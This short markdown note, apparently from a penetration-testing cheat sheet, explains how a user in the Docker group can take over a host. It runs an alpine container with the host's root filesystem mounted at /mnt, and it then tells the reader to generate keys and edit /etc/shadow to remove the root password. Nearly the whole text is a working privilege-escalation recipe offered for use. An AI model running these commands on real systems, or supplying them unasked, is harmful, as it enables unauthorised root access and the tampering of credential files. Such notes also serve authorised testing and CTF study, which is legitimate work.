- - -
### mount the real host  '/root' directory to '/mnt' : 

Confirm that you are a member of **Docker Group** 
```sh
groups
```

```sh
 docker run -v  /:/mnt -it alpine
```

```sh
ls ; cd mnt ;  ls
```

Now generate **key-gens** , vim /etc/shadow and remove root password,etc....

- - -

